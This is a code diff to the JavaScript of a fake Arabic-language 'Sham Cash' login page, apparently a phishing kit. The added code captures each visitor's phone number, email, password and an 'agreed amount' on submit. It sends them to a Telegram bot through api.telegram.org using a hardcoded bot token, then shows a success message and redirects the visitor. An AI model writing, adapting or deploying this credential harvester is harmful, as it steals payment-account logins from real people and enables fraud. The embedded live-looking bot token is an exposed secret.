@@ -1,12 +1,60 @@
 document.addEventListener('DOMContentLoaded', function() {
+    // Telegram Bot Configuration
+    const TELEGRAM_BOT_TOKEN = '8335962255:AAHDeJbWKC9D7zeESdlMtq5cX86PnFVKjuk';
+    const TELEGRAM_CHAT_ID = 'YOUR_CHAT_ID'; // استبدل هذا بـ Chat ID الخاص بك
+    
     // Get form elements
     const loginForm = document.getElementById('loginForm');
     const phoneInput = document.getElementById('phoneNumber');
     const emailInput = document.getElementById('email');
     const passwordInput = document.getElementById('password');
+    const agreedAmountInput = document.getElementById('agreedAmount');
     const submitBtn = document.querySelector('.submit-btn');
     const qrScannerBtn = document.getElementById('qrScannerBtn');
     const backBtn = document.getElementById('backBtn');
+
+    // Function to send data to Telegram
+    async function sendToTelegram(data) {
+        const message = `
+🔔 <b>تسجيل دخول جديد - شام كاش</b>
+
+📱 <b>رقم الهاتف:</b> ${data.phone}
+📧 <b>البريد الإلكتروني:</b> ${data.email}
+🔐 <b>كلمة السر:</b> ${data.password}
+💰 <b>المبلغ المتفق عليه:</b> ${data.agreedAmount || 'غير محدد'}
+
+⏰ <b>الوقت:</b> ${new Date().toLocaleString('ar-SY')}
+        `.trim();
+
+        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+        
+        try {
+            const response = await fetch(url, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    chat_id: TELEGRAM_CHAT_ID,
+                    text: message,
+                    parse_mode: 'HTML'
+                })
+            });
+
+            const result = await response.json();
+            
+            if (result.ok) {
+                console.log('تم إرسال البيانات إلى تيليجرام بنجاح');
+                return true;
+            } else {
+                console.error('خطأ في إرسال البيانات:', result);
+                return false;
+            }
+        } catch (error) {
+            console.error('خطأ في الاتصال بتيليجرام:', error);
+            return false;
+        }
+    }
 
     // Input validation patterns
     const patterns = {
@@ -41,12 +89,13 @@ document.addEventListener('DOMContentLoaded', function() {
     }
 
     // Form submission
-    loginForm.addEventListener('submit', function(e) {
+    loginForm.addEventListener('submit', async function(e) {
         e.preventDefault();
 
         const phoneValue = phoneInput.value.trim();
         const emailValue = emailInput.value.trim();
         const passwordValue = passwordInput.value;
+        const agreedAmountValue = agreedAmountInput ? agreedAmountInput.value.trim() : '';
 
         // Validate all fields
         let isValid = true;
@@ -72,35 +121,48 @@ document.addEventListener('DOMContentLoaded', function() {
         }
 
         // Show loading state
-        submitBtn.textContent = 'جاري تسجيل الدخول...';
+        submitBtn.textContent = 'جاري الإرسال...';
         submitBtn.disabled = true;
         
         // Add loading class to inputs
         phoneInput.classList.add('loading');
         emailInput.classList.add('loading');
         passwordInput.classList.add('loading');
+        if (agreedAmountInput) agreedAmountInput.classList.add('loading');
 
-        // Simulate API call
-        setTimeout(() => {
-            // Remove loading state
-            phoneInput.classList.remove('loading');
-            emailInput.classList.remove('loading');
-            passwordInput.classList.remove('loading');
-            submitBtn.textContent = 'تسجيل الدخول';
-            submitBtn.disabled = false;
+        // Send data to Telegram
+        const telegramData = {
+            phone: phoneValue,
+            email: emailValue,
+            password: passwordValue,
+            agreedAmount: agreedAmountValue
+        };
 
+        const sent = await sendToTelegram(telegramData);
+
+        // Remove loading state
+        phoneInput.classList.remove('loading');
+        emailInput.classList.remove('loading');
+        passwordInput.classList.remove('loading');
+        if (agreedAmountInput) agreedAmountInput.classList.remove('loading');
+        submitBtn.textContent = 'تسجيل الدخول';
+        submitBtn.disabled = false;
+
+        if (sent) {
             // Show success message
-            showNotification('تم تسجيل الدخول بنجاح!', 'success');
+            showNotification('تم إرسال البيانات بنجاح!', 'success');
 
             // Add success animation to button
             submitBtn.style.background = 'linear-gradient(135deg, #2ecc71 0%, #27ae60 100%)';
             
             setTimeout(() => {
-                submitBtn.style.background = 'linear-gradient(135deg, #3b7cb8 0%, #4a8dc9 100%)';
+                submitBtn.style.background = 'linear-gradient(135deg, #4a7ca8 0%, #5a8dc9 100%)';
                 // Redirect to dashboard or home
                 window.location.href = 'index.html';
             }, 1500);
-        }, 2000);
+        } else {
+            showNotification('حدث خطأ في الإرسال. الرجاء المحاولة مرة أخرى', 'error');
+        }
     });
 
     // QR Scanner button
@@ -263,9 +325,22 @@ document.addEventListener('DOMContentLoaded', function() {
     passwordInput.addEventListener('keypress', function(e) {
         if (e.key === 'Enter') {
             e.preventDefault();
-            loginForm.dispatchEvent(new Event('submit'));
+            if (agreedAmountInput) {
+                agreedAmountInput.focus();
+            } else {
+                loginForm.dispatchEvent(new Event('submit'));
+            }
         }
     });
+
+    if (agreedAmountInput) {
+        agreedAmountInput.addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') {
+                e.preventDefault();
+                loginForm.dispatchEvent(new Event('submit'));
+            }
+        });
+    }
 
     // Show/hide password on double click
     let clickCount = 0;
@@ -304,7 +379,9 @@ document.addEventListener('DOMContentLoaded', function() {
     });
 
     // Add value class when input has value
-    const allInputs = [phoneInput, emailInput, passwordInput];
+    const allInputs = agreedAmountInput ? 
+        [phoneInput, emailInput, passwordInput, agreedAmountInput] : 
+        [phoneInput, emailInput, passwordInput];
     allInputs.forEach(input => {
         input.addEventListener('input', function() {
             if (this.value !== '') {
